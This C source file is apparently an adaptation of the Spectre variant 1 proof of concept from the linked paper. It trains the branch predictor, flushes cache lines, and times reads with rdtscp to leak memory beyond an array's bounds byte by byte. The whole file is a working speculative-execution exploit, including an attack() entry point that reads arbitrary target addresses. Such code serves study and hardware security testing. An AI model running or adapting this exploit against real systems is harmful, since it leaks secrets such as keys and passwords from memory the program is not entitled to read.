/// https://spectreattack.com/spectre.pdf

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <x86intrin.h>

unsigned int array1_size = 16;
uint8_t array1[16] = { 1,2, 3, 4, 5, 6, 7, 8, 9, 10, 11,12, 13, 14, 15, 16 };
uint8_t array2[256 * 512];

const int cache_hit_threshold = 100;

void victim_function(const size_t x, bool debug) {
    if (debug) {
        printf("Victim function called with x=%zu\n", x);
    }
    if (x < array1_size) {
        uint8_t temp = array2[array1[x] * 512];
    }
}

bool readMemoryByte(const int cache_hit_threshold, const size_t malicious_x, uint8_t *value, int *score, bool debug) {
    static int results[256];
    int j = -1, k = -1;
    unsigned int junk = 0;
    for (int i = 0; i < 256; i++) {
        results[i] = 0;
    }

    for (int tries = 999; tries > 0; tries--) {
        /* Flush array2[512*(0..255)] from cache */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&array2[i * 512]);
        }

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        const size_t training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);

            /* Delay (can also mfence) */
            for (volatile int z = 0; z < 100; z++) {
            }

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            size_t x = j % 6 - 1 & ~0xFFFF; /* Set x=0xFFFFFFFFFFFF0000 if j%6==0, else x=0 */
            x = x | x >> 16; /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ x & (malicious_x ^ training_x);

            /* Call the victim! */
            victim_function(x, debug);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (int i = 0; i < 256; i++) {
            const int mix_i = i * 167 + 13 & 255;
            const volatile uint8_t *addr = &array2[mix_i * 512];

            /*
            We need to accuratly measure the memory access to the current index of the
            array so we can determine which index was cached by the malicious mispredicted code.

            The best way to do this is to use the rdtscp instruction, which measures current
            processor ticks, and is also serialized.
            */
            const register uint64_t time1 = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            const register uint64_t time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

            if ((int) time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (int i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= 2 * results[k] + 5 || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    *value = (uint8_t) j;
    *score = results[j];
    return results[j] >= 2 * results[k];
}


bool read_target(int len, size_t malicious_x, int cache_hit_threshold, char *output, bool debug) {
    for (int i = 0; i < (int) sizeof(array2); i++) {
        /* write to array2 so in RAM not copy-on-write zero pages */
        array2[i] = 1;
    }

    printf("Using a cache hit threshold of %d, reading %d bytes:\n", cache_hit_threshold, len);
    while (--len >= 0) {
        uint8_t value;
        int score;
        printf("Reading at %p: ", (void *) malicious_x);

        const bool success = readMemoryByte(cache_hit_threshold, malicious_x, &value, &score, debug);

        printf("%s: ", success ? "Success" : "Unclear");
        printf("0x%02X='%c' score=%d", value, value > 31 && value < 127 ? value : '?', score);
        printf("\n");

        if (!success) {
            return false;
        }

        char char_to_append = value > 31 && value < 127 ? value : '?';
        strncat(output, &char_to_append, 1);

        malicious_x++;
    }
    return true;
}

int attack(char *test, int len, char *output, bool debug) {
    const size_t malicious_x = test - (char *) array1;

    if (read_target(len, malicious_x, cache_hit_threshold, output, debug)) {
        printf("Read succeeded: %s\n", output);
        return 0;
    }
    printf("Read failed\n\n");
    return 1;
}
